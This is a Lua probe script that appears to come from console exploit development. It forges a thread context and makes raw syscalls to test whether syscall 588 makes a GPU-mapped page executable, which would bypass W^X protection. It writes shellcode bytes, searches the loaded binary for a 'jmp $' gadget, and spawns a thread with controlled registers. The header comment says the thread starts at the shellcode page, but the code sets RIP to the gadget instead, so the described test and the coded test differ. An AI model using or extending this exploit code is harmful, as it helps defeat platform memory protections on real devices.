-- CRASH_CLASS: HIGH (page fault in the child kills the probe process;
--            that death is itself the negative result)
-- PROBE 113b-control: does sys 588 make a GPU-mapped page EXECUTABLE?
--
-- Context: probe 54d (2026-10-18) called sys 588 on a GPU-mmap page with
-- prot=RWX (7), RX (5), X (4), 0x33 and 0x37 and every call returned 0, with
-- the note "Cannot test execution without a jump primitive". Probe 54l wrote
-- a ret-sled to a GPU page, called 588(prot=7) and got 0, then stopped.
-- Execution was never attempted. Probe 156d then gave us the jump primitive:
-- thr_create(430) starts a thread with fully controlled RIP/RSP/registers,
-- and the child demonstrably executed `mov [rdx],rax; ret` in eboot.
--
-- This probe closes the loop: write `mov dword [rdi], 0xC0DECAFE; ret`
-- (C7 07 FE CA DE C0 C3) to a GPU-mapped page, call 588 on it, and start a
-- thread with RIP at the page. The marker either appears (588 broke W^X) or
-- the child faults (W^X holds).

print("=== PROBE 113b-control: EXECUTION AFTER SYS 588 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)
local sc588 = make_syscall(588)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RAX = 0x048, 0x078

print("[0] canary pid=" .. tostring(select(2, pcall(function() return sc_getpid():tonumber() end))))

-- Eboot base for the jmp $ parking target
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot_base))

local function find_pair(base, limit, p0, p1)
    local off = 0
    while off < limit do
        local v = rd(base + off)
        if not v then return nil end
        local b0 = v % 0x100
        local b1 = math.floor(v / 0x100) % 0x100
        local b2 = math.floor(v / 0x10000) % 0x100
        local b3 = math.floor(v / 0x1000000) % 0x100
        if b0 == p0 and b1 == p1 then return base + off end
        if b1 == p0 and b2 == p1 then return base + off + 1 end
        if b2 == p0 and b3 == p1 then return base + off + 2 end
        local v2 = rd(base + off + 4)
        if v2 and b3 == p0 and (v2 % 0x100) == p1 then return base + off + 3 end
        off = off + 4
    end
    return nil
end

local jmp_self = find_pair(eboot_base, 0x100000, 0xEB, 0xFE)
if not jmp_self then
    print("[0] no EB FE found; aborting")
    return
end
print("[0] jmp $=" .. q(jmp_self))

-- Maps: shellcode page, marker, stack — same flags as 54d/156d
local page_size = 0x4000
local ok_s, code = pcall(function()
    return sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local ok_m, marker = pcall(function()
    return sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local ok_t, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(page_size * 4), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local ch, cl = get_hi_lo(code)
if not ok_s or not ok_m or not ok_t or (ch == 0 and cl == 0) then
    print("[0] mmap failed; aborting")
    return
end
zero(code, page_size)
zero(marker, page_size)
print("[0] code=" .. q(code) .. " marker=" .. q(marker) .. " stack=" .. q(stack_base))

-- Shellcode: mov dword [rdi], 0xC0DECAFE ; ret
--   C7 07 FE CA DE C0 C3
-- Written as dwords: BEWARE little-endian packing:
--   dword0 = bytes C7 07 FE CA = 0xCAFE07C7
--   dword1 = bytes DE C0 C3 00 = 0x00C3C0DE (00 pad)
wd(code, 0xCAFE07C7)
wd(code + 4, 0x00C3C0DE)
local x0, x1 = rd(code), rd(code + 4)
print(string.format("[1] code[0]=%08X code[1]=%08X (want CAFE07C7 00C3C0DE)", x0 or 0, x1 or 0))
if x0 ~= 0xCAFE07C7 or x1 ~= 0x00C3C0DE then
    print("[1] shellcode write failed; aborting")
    return
end

-- Call 588 on the page, mirroring 54d's shape: (addr, size, &struct)
local attr = memory.alloc(0x40)
zero(attr, 0x40)
wd(attr, 7)
local ok_588, ret_588 = pcall(function()
    return sc588(code, uint64(page_size), uint64(attr))
end)
print("[1] 588(code, 0x4000, &{prot=7}) = " ..
    (ok_588 and q(ret_588) or "PCALL-FAIL"))

-- Re-read the bytes after 588: did it touch our data?
local y0, y1 = rd(code), rd(code + 4)
print(string.format("[1] post-588 code[0]=%08X code[1]=%08X", y0 or 0, y1 or 0))

-- Child stack: first qword is the parking target
local stack_top = stack_base + page_size * 4 - 0x100
wq(stack_top, jmp_self)

-- thr_create at RIP = our page
local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + C_MAGIC, uint64(0x480))
wd(ctx + C_FLAGS, 0)
wq(ctx + C_TYPE, uint64(0x10000))
wq(ctx + C_CS, uint64(0x43))
wq(ctx + C_SS, uint64(0x3B))
wq(ctx + C_RIP, jmp_self)
wq(ctx + C_RSP, stack_top)
wq(ctx + C_RDI, marker)

print("[2] starting child at RIP=" .. q(jmp_self) .. " RDI=" .. q(marker))
local ok_tc, rv_tc = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
end)
local child_tid = rq(tid_buf)
print("[2] thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. tostring(to_num(rv_tc)) ..
    " tid=" .. q(child_tid))

local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 300000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local got = rd(marker)
print(string.format("[3] marker[0]=%08X (want C0DECAFE)", got or 0))
local ok_k, rv_k = pcall(function() return sc_thr_kill(child_tid, uint64(0)) end)
print("[3] thr_kill(child, 0): rv=" .. tostring(to_num(rv_k)))

if got == 0xC0DECAFE then
    print("[3] *** EXECUTED: sys 588 made the page executable ***")
else
    print("[3] no execution: the child did not write the marker")
end

local ok_c2, pid_c2 = pcall(function() return sc_getpid():tonumber() end)
print("[4] final canary: ok=" .. tostring(ok_c2) .. " pid=" .. tostring(pid_c2))
print("")
print("=== PROBE 113b-control COMPLETE ===")
